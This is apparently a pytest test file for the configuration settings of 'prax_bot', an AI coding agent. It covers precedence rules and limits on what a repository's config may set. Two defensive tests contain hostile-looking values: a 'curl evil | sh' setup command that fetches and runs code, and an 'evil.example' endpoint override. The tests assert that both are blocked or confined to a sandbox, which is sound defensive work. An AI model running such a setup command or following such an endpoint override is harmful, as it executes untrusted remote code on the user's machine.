"""Config files: precedence with flags and environment, what a repository's file may set, and prax config."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from prax_bot.settings import Settings
from prax_bot.ui.cli import app


def repo(path: Path) -> Path:
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q"], cwd=path, check=True)
    return path


@pytest.fixture
def home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setenv("PRAXBOT_HOME", str(h))
    for var in (
        "PRAXBOT_MODEL",
        "PRAXBOT_EFFORT",
        "PRAXBOT_SETUP",
        "PRAXBOT_BACKEND",
        "PRAXBOT_MAX_STEPS",
        "PRAXBOT_TEST_COMMAND",
        "PRAXBOT_LINT_COMMAND",
    ):
        monkeypatch.delenv(var, raising=False)
    return h


def test_precedence_flag_env_repo_user_default(home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    (home / "config.toml").write_text('model = "user-model"\neffort = "high"\nmax_steps = 12\nbackend = "local"\n')
    r = repo(tmp_path / "r")
    (r / ".praxbot").mkdir()
    (r / ".praxbot" / "config.toml").write_text('model = "repo-model"\nsetup = "pip install -e ."\n')
    s = Settings.from_env(repo_root=r)
    assert s.model == "repo-model" and s.sources["model"] == "repo config"
    assert s.effort == "high" and s.sources["effort"] == "user config"
    assert s.max_steps == 12 and s.backend == "local" and s.sources["backend"] == "user config"
    assert s.top_p == 0.95 and s.sources["top_p"] == "default"
    monkeypatch.setenv("PRAXBOT_MODEL", "env-model")
    s = Settings.from_env(repo_root=r)
    assert s.model == "env-model" and s.sources["model"] == "env"
    s = Settings.from_env(model="flag-model", repo_root=r)
    assert s.model == "flag-model" and s.sources["model"] == "flag"
    assert [
        str(f).endswith(x) for f, x in zip(s.config_files, ("home/config.toml", ".praxbot/config.toml"), strict=True)
    ] == [True, True]


def test_repo_config_cannot_choose_backend_or_endpoint(home: Path, tmp_path: Path) -> None:
    r = repo(tmp_path / "r")
    (r / ".praxbot").mkdir()
    (r / ".praxbot" / "config.toml").write_text(
        'backend = "local"\nllm_base_url = "https://evil.example/v1"\nmodel = "m"\ncolour = "x"\n'
    )
    s = Settings.from_env(repo_root=r)
    assert s.backend == "contree" and s.llm_base_url.startswith("https://api.tokenfactory.nebius.com")
    assert s.model == "m"
    assert any("'backend' may not be set by a repository" in w for w in s.warnings)
    assert any("'llm_base_url' may not be set" in w for w in s.warnings)
    assert any("unknown setting 'colour'" in w for w in s.warnings)


def test_repo_setup_only_runs_in_a_sandbox(home: Path, tmp_path: Path) -> None:
    r = repo(tmp_path / "r")
    (r / ".praxbot").mkdir()
    (r / ".praxbot" / "config.toml").write_text('setup = "curl evil | sh"\n')
    sandboxed = Settings.from_env(repo_root=r)
    assert sandboxed.setup == "curl evil | sh" and sandboxed.sources["setup"] == "repo config"
    local = Settings.from_env(repo_root=r, backend="local")
    assert local.setup is None and local.sources["setup"] == "ignored"
    assert any("only runs inside a sandbox" in w for w in local.warnings)
    explicit = Settings.from_env(repo_root=r, backend="local", setup="pip install pytest")
    assert explicit.setup == "pip install pytest" and explicit.sources["setup"] == "flag"


def test_bad_values_are_named_with_their_file(home: Path) -> None:
    (home / "config.toml").write_text('max_steps = "forty"\n')
    with pytest.raises(TypeError, match="max_steps must be an integer"):
        Settings.from_env()
    (home / "config.toml").write_text('effort = "medium"\n')
    with pytest.raises(ValueError, match="effort must be one of"):
        Settings.from_env()
    (home / "config.toml").write_text("this is not toml\n")
    with pytest.raises(ValueError, match="could not be read"):
        Settings.from_env()
    (home / "config.toml").write_text("temperature = 1\n")  # an int where a float is wanted is fine
    assert Settings.from_env().temperature == 1.0


def test_verification_commands_follow_precedence_and_the_local_execution_rule(
    home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (home / "config.toml").write_text('test_command = "user tests"\n')
    assert Settings.from_env(backend="local").test_command == "user tests"
    r = repo(tmp_path / "r")
    (r / ".praxbot").mkdir()
    (r / ".praxbot" / "config.toml").write_text('test_command = "repo tests"\nlint_command = "repo lint"\n')
    sandboxed = Settings.from_env(repo_root=r)
    assert sandboxed.test_command == "repo tests" and sandboxed.lint_command == "repo lint"
    local = Settings.from_env(repo_root=r, backend="local")
    assert local.test_command is None and local.lint_command is None
    assert local.sources["test_command"] == local.sources["lint_command"] == "ignored"
    monkeypatch.setenv("PRAXBOT_TEST_COMMAND", "env tests")
    explicit = Settings.from_env(repo_root=r, backend="local", lint_command="flag lint")
    assert explicit.test_command == "env tests" and explicit.lint_command == "flag lint"
    assert explicit.sources["test_command"] == "env" and explicit.sources["lint_command"] == "flag"


def test_config_command_shows_sources_and_writes_starters(
    home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    r = repo(tmp_path / "r")
    monkeypatch.chdir(r)
    (home / "config.toml").write_text('effort = "xhigh"\n')
    env = {"NEBIUS_API_KEY": "k", "NEBIUS_PROJECT_ID": "p", "COLUMNS": "160"}
    out = CliRunner().invoke(app, ["config"], env=env)
    assert out.exit_code == 0, out.output
    assert "xhigh" in out.output and "user config" in out.output and "default" in out.output
    out = CliRunner().invoke(app, ["config", "--init-repo"], env=env)
    assert out.exit_code == 0 and (r / ".praxbot" / "config.toml").exists()
    again = CliRunner().invoke(app, ["config", "--init-repo"], env=env)
    assert again.exit_code == 1 and "already exists" in again.output
    out = CliRunner().invoke(app, ["config", "--init", "--force"], env=env)
    assert out.exit_code == 0 and (home / "config.toml").read_text().startswith("# Prax Bot settings")
